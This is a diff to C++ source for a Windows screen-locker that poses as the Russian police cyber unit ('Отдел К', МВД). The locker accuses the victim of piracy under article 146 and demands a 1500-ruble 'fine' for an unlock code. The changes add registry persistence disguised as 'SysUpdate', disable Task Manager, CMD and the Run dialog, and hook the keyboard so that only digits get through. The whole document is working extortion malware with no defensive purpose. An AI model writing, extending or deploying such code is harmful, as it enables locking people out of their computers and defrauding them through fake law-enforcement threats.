@@ -8,7 +8,7 @@
 
 #pragma execution_character_set("utf-8")
 
-// Код разблокировки (в честь 146 статьи)
+// Код разблокировки
 static const std::wstring kPassword = L"1461";
 
 static HHOOK   g_kbHook    = nullptr;
@@ -26,26 +26,39 @@ static void InstallPersistence() {
     CopyFileW(self, dst.c_str(), FALSE);
 
     HKEY hKey;
+    // 1. Добавление в автозагрузку
     if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
         RegSetValueExW(hKey, L"SysUpdate", 0, REG_SZ, (const BYTE*)dst.c_str(), (DWORD)((dst.size()+1)*sizeof(wchar_t)));
         RegCloseKey(hKey);
     }
+    
+    // 2. Блокировка Диспетчера задач, CMD и Win+R
     if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, nullptr, 0, KEY_SET_VALUE, nullptr, &hKey, nullptr) == ERROR_SUCCESS) {
         DWORD v = 1;
         RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
+        RegSetValueExW(hKey, L"DisableCMD", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
+        RegCloseKey(hKey);
+    }
+    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, nullptr, 0, KEY_SET_VALUE, nullptr, &hKey, nullptr) == ERROR_SUCCESS) {
+        DWORD v = 1;
+        RegSetValueExW(hKey, L"NoRun", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
         RegCloseKey(hKey);
     }
 }
 
+// Жесткий перехват клавиатуры
 static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION && g_locked) {
         KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
-            // Жестко блокируем системные клавиши
-            if (p->vkCode == VK_LWIN || p->vkCode == VK_RWIN || p->vkCode == VK_TAB ||
-                p->vkCode == VK_ESCAPE || p->vkCode == VK_F4 || p->vkCode == VK_MENU ||
-                p->vkCode == VK_CONTROL || p->vkCode == VK_DELETE || p->vkCode == VK_F12) {
-                return 1;
+            
+            // Разрешаем ТОЛЬКО цифры, Backspace и Enter. Остальное - блок.
+            bool is_digit = (p->vkCode >= '0' && p->vkCode <= '9') || 
+                            (p->vkCode >= VK_NUMPAD0 && p->vkCode <= VK_NUMPAD9);
+            bool is_control = (p->vkCode == VK_BACK || p->vkCode == VK_RETURN);
+            
+            if (!is_digit && !is_control) {
+                return 1; // Глотаем клавишу
             }
         }
     }
@@ -54,12 +67,21 @@ static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lP
 
 static void Unlock() {
     g_locked = false;
+    
+    // Снимаем блокировки системы
     HKEY hk;
     if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
         DWORD v = 0;
         RegSetValueExW(hk, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
+        RegSetValueExW(hk, L"DisableCMD", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
         RegCloseKey(hk);
     }
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
+        DWORD v = 0;
+        RegSetValueExW(hk, L"NoRun", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
+        RegCloseKey(hk);
+    }
+    
     UnhookWindowsHookEx(g_kbHook);
     DestroyWindow(g_hwnd);
     PostQuitMessage(0);
@@ -72,12 +94,12 @@ static LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
         int sh = GetSystemMetrics(SM_CYSCREEN);
         
         SetWindowPos(h, HWND_TOPMOST, 0, 0, sw, sh, SWP_SHOWWINDOW);
-        ShowCursor(FALSE); // Курсор скрыт для пущего эффекта
+        ShowCursor(FALSE); // Курсор скрыт
         g_hwnd = h;
         SetForegroundWindow(h);
         SetFocus(h);
 
-        SetTimer(h, 1, 500, nullptr); // Таймер для мигающего курсора
+        SetTimer(h, 1, 500, nullptr); // Мигание
         return 0;
     }
     case WM_TIMER: {
@@ -92,128 +114,136 @@ static LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
         int cx = rc.right;
         int cy = rc.bottom;
 
-        // 1. Фон (Классический серый, как в старых окнах)
-        HBRUSH bg = CreateSolidBrush(RGB(200, 200, 200));
+        // 1. Фон (Глубокий черный)
+        HBRUSH bg = CreateSolidBrush(RGB(10, 10, 10));
         FillRect(dc, &rc, bg);
         DeleteObject(bg);
 
-        // 2. Верхняя синяя полоса (заголовок окна)
-        RECT rcTop = {0, 0, cx, 40};
-        HBRUSH topBg = CreateSolidBrush(RGB(0, 80, 160));
+        // 2. Верхняя полоса (Кровавый)
+        RECT rcTop = {0, 0, cx, 45};
+        HBRUSH topBg = CreateSolidBrush(RGB(50, 0, 0));
         FillRect(dc, &rcTop, topBg);
         DeleteObject(topBg);
+        
+        HPEN penRed = CreatePen(PS_SOLID, 2, RGB(200, 0, 0));
+        SelectObject(dc, penRed);
+        MoveToEx(dc, 0, 45, NULL);
+        LineTo(dc, cx, 45);
 
         SetBkMode(dc, TRANSPARENT);
-        SetTextColor(dc, RGB(255, 255, 255));
-        HFONT fTitleBar = CreateFontW(18, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Tahoma");
+        SetTextColor(dc, RGB(255, 0, 0));
+        HFONT fTitleBar = CreateFontW(20, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Consolas");
         SelectObject(dc, fTitleBar);
-        RECT rcTopText = {10, 0, cx, 40};
-        DrawTextW(dc, L"Внимание! Ваш компьютер заблокирован", -1, &rcTopText, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
+        RECT rcTopText = {15, 0, cx, 45};
+        DrawTextW(dc, L"SYSTEM ERROR // КРИТИЧЕСКАЯ БЛОКИРОВКА", -1, &rcTopText, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
 
-        // 3. Основной блок (белая панель)
-        int panelW = 800;
+        // 3. Основной блок (Темная панель с красной рамкой)
+        int panelW = 850;
         int panelH = 500;
         int panelX = (cx - panelW) / 2;
-        int panelY = 80;
+        int panelY = 100;
         RECT rcPanel = {panelX, panelY, panelX + panelW, panelY + panelH};
         
-        HBRUSH panelBg = CreateSolidBrush(RGB(255, 255, 255));
+        HBRUSH panelBg = CreateSolidBrush(RGB(20, 20, 20));
         FillRect(dc, &rcPanel, panelBg);
         DeleteObject(panelBg);
         
-        FrameRect(dc, &rcPanel, (HBRUSH)GetStockObject(GRAY_BRUSH));
+        // Двойная кровавая рамка
+        FrameRect(dc, &rcPanel, (HBRUSH)GetStockObject(WHITE_BRUSH));
+        SelectObject(dc, penRed);
+        Rectangle(dc, panelX - 2, panelY - 2, panelX + panelW + 2, panelY + panelH + 2);
 
-        // 4. Логотип (стилизованный щит)
-        int logoX = panelX + 20;
-        int logoY = panelY + 20;
-        HBRUSH shieldBg = CreateSolidBrush(RGB(220, 220, 220));
-        RECT rcShield = {logoX, logoY, logoX + 100, logoY + 100};
+        // 4. Логотип "ОТДЕЛ К" (Красный череп/щит)
+        int logoX = panelX + 30;
+        int logoY = panelY + 30;
+        RECT rcShield = {logoX, logoY, logoX + 120, logoY + 120};
+        HBRUSH shieldBg = CreateSolidBrush(RGB(120, 0, 0));
         FillRect(dc, &rcShield, shieldBg);
         DeleteObject(shieldBg);
-        FrameRect(dc, &rcShield, (HBRUSH)GetStockObject(BLACK_BRUSH));
+        FrameRect(dc, &rcShield, (HBRUSH)GetStockObject(WHITE_BRUSH));
         
-        SetTextColor(dc, RGB(0, 0, 0));
-        HFONT fLogo = CreateFontW(40, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Arial");
+        SetTextColor(dc, RGB(255, 255, 255));
+        HFONT fLogo = CreateFontW(30, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Consolas");
         SelectObject(dc, fLogo);
-        DrawTextW(dc, L"МВД", -1, &rcShield, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
+        DrawTextW(dc, L"ОТДЕЛ\n  К", -1, &rcShield, DT_CENTER | DT_VCENTER | DT_WORDBREAK);
 
         // 5. Заголовок внутри панели
-        HFONT fHeader = CreateFontW(24, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Tahoma");
+        HFONT fHeader = CreateFontW(26, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Consolas");
         SelectObject(dc, fHeader);
-        SetTextColor(dc, RGB(180, 0, 0));
-        RECT rcHeader = {logoX + 120, logoY, panelX + panelW - 20, logoY + 60};
-        DrawTextW(dc, L"Ваш компьютер заблокирован", -1, &rcHeader, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
+        SetTextColor(dc, RGB(255, 0, 0));
+        RECT rcHeader = {logoX + 140, logoY, panelX + panelW - 20, logoY + 60};
+        DrawTextW(dc, L"ДОСТУП ЗАПРЕЩЕН", -1, &rcHeader, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
 
         // 6. Основной текст
-        HFONT fText = CreateFontW(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Tahoma");
+        HFONT fText = CreateFontW(18, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Consolas");
         SelectObject(dc, fText);
-        SetTextColor(dc, RGB(0, 0, 0));
+        SetTextColor(dc, RGB(220, 220, 220));
         
-        int textY = logoY + 120;
-        RECT rcText = {panelX + 20, textY, panelX + panelW - 20, panelY + panelH};
+        int textY = logoY + 150;
+        RECT rcText = {panelX + 30, textY, panelX + panelW - 30, panelY + panelH - 120};
         
         const wchar_t* mainText = 
-            L"Уважаемый пользователь!\n\n"
-            L"Ваш компьютер был заблокирован сотрудниками Отдела К по причине\n"
-            L"нарушения статьи 146 Уголовного Кодекса РФ (Незаконное использование\n"
-            L"объектов авторского права).\n\n"
-            L"В ходе проверки было установлено, что с вашего IP-адреса\n"
-            L"осуществлялось распространение нелицензионного программного обеспечения.\n\n"
-            L"Для разблокировки вашего компьютера вам необходимо оплатить штраф\n"
-            L"в размере 1500 рублей. Оплата производится через терминалы\n"
-            L"мгновенной оплаты (Qiwi, WebMoney, Яндекс.Деньги).\n\n"
-            L"После оплаты вы получите код разблокировки, который нужно ввести\n"
-            L"в поле ниже.";
+            L"> Ваше устройство заблокировано за нарушение\n"
+            L"  статьи 146 УК РФ (Незаконное использование ПО).\n\n"
+            L"> Данные о вашем IP-адресе и MAC-адресе переданы\n"
+            L"  в правоохранительные органы.\n\n"
+            L"> Для снятия блокировки необходимо оплатить штраф\n"
+            L"  в размере 1500 рублей.\n\n"
+            L"> Введите код разблокировки, полученный после оплаты.\n"
+            L"  (Вводить можно ТОЛЬКО цифры)";
             
         DrawTextW(dc, mainText, -1, &rcText, DT_LEFT | DT_TOP | DT_WORDBREAK);
 
-        // 7. Поле ввода
-        int inputY = panelY + panelH - 100;
-        RECT rcInputLabel = {panelX + 20, inputY - 30, panelX + 300, inputY};
-        DrawTextW(dc, L"Код разблокировки:", -1, &rcInputLabel, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
+        // 7. Поле ввода (Терминальный стиль)
+        int inputY = panelY + panelH - 90;
+        RECT rcInputLabel = {panelX + 30, inputY - 30, panelX + 300, inputY};
+        SetTextColor(dc, RGB(150, 0, 0));
+        DrawTextW(dc, L"ВВЕДИТЕ КОД:", -1, &rcInputLabel, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
 
-        RECT rcInput = {panelX + 20, inputY, panelX + 400, inputY + 30};
-        HBRUSH white = CreateSolidBrush(RGB(255, 255, 255));
-        FillRect(dc, &rcInput, white);
-        DeleteObject(white);
-        FrameRect(dc, &rcInput, (HBRUSH)GetStockObject(GRAY_BRUSH));
+        RECT rcInput = {panelX + 30, inputY, panelX + 400, inputY + 35};
+        HBRUSH blackIn = CreateSolidBrush(RGB(0, 0, 0));
+        FillRect(dc, &rcInput, blackIn);
+        DeleteObject(blackIn);
+        FrameRect(dc, &rcInput, (HBRUSH)GetStockObject(WHITE_BRUSH));
         
-        SetTextColor(dc, RGB(0, 0, 0));
-        RECT rcInputText = rcInput; rcInputText.left += 5;
+        // Введенный текст (Красный, как кровь)
+        SetTextColor(dc, RGB(255, 0, 0));
+        RECT rcInputText = rcInput; rcInputText.left += 10;
         DrawTextW(dc, g_input.c_str(), -1, &rcInputText, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
 
         // Мигающий курсор
         if (g_blink) {
             SIZE sz;
             GetTextExtentPoint32W(dc, g_input.c_str(), g_input.length(), &sz);
-            RECT rcCursor = {rcInputText.left + sz.cx, rcInputText.top + 5, rcInputText.left + sz.cx + 3, rcInputText.bottom - 5};
-            HBRUSH curBrush = CreateSolidBrush(RGB(0, 0, 0));
+            RECT rcCursor = {rcInputText.left + sz.cx, rcInputText.top + 5, rcInputText.left + sz.cx + 4, rcInputText.bottom - 5};
+            HBRUSH curBrush = CreateSolidBrush(RGB(255, 0, 0));
             FillRect(dc, &rcCursor, curBrush);
             DeleteObject(curBrush);
         }
 
         // 8. Кнопка "Разблокировать"
-        RECT rcBtn = {panelX + 420, inputY, panelX + 550, inputY + 30};
-        HBRUSH btnBg = CreateSolidBrush(RGB(220, 220, 220));
+        RECT rcBtn = {panelX + 420, inputY, panelX + 550, inputY + 35};
+        HBRUSH btnBg = CreateSolidBrush(RGB(50, 0, 0));
         FillRect(dc, &rcBtn, btnBg);
         DeleteObject(btnBg);
-        FrameRect(dc, &rcBtn, (HBRUSH)GetStockObject(BLACK_BRUSH));
+        FrameRect(dc, &rcBtn, (HBRUSH)GetStockObject(RED_BRUSH));
         
-        SetTextColor(dc, RGB(0, 0, 0));
-        DrawTextW(dc, L"Разблокировать", -1, &rcBtn, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
+        SetTextColor(dc, RGB(255, 255, 255));
+        DrawTextW(dc, L"ENTER", -1, &rcBtn, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
 
-        // 9. Нижняя панель с "пометками"
+        // 9. Нижняя панель
         RECT rcBottom = {0, cy - 40, cx, cy};
-        HBRUSH bottomBg = CreateSolidBrush(RGB(240, 240, 240));
+        HBRUSH bottomBg = CreateSolidBrush(RGB(50, 0, 0));
         FillRect(dc, &rcBottom, bottomBg);
         DeleteObject(bottomBg);
         
-        SetTextColor(dc, RGB(100, 100, 100));
-        HFONT fSmall = CreateFontW(14, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Tahoma");
+        SetTextColor(dc, RGB(150, 0, 0));
+        HFONT fSmall = CreateFontW(14, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Consolas");
         SelectObject(dc, fSmall);
-        RECT rcBottomText = {10, cy - 40, cx - 10, cy};
-        DrawTextW(dc, L"© 2012 Отдел К. Все права защищены. Лицензия №146-УК.", -1, &rcBottomText, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
+        RECT rcBottomText = {15, cy - 40, cx - 15, cy};
+        DrawTextW(dc, L"MINISTRY OF INTERNAL AFFAIRS // SECURITY MODULE ACTIVE", -1, &rcBottomText, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
 
+        DeleteObject(penRed);
         DeleteObject(fTitleBar);
         DeleteObject(fLogo);
         DeleteObject(fHeader);
@@ -223,9 +253,10 @@ static LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
         return 0;
     }
     case WM_CHAR: {
+        // Принимаем только цифры, Backspace и Enter
         if (w == VK_BACK && !g_input.empty()) {
             g_input.pop_back();
-        } else if (w >= 32 && w < 127 && g_input.length() < 15) {
+        } else if (w >= '0' && w <= '9' && g_input.length() < 10) {
             g_input.push_back((wchar_t)w);
         }
         InvalidateRect(h, nullptr, TRUE);
@@ -260,7 +291,7 @@ int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int) {
     wc.lpszClassName = L"LockerWnd";
     RegisterClassW(&wc);
 
-    CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW, L"LockerWnd", L"System", WS_POPUP,
+    CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW, L"LockerWnd", L"System", WS_EX_TOPMOST, 
         0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), nullptr, nullptr, hInst, nullptr);
 
     MSG msg;
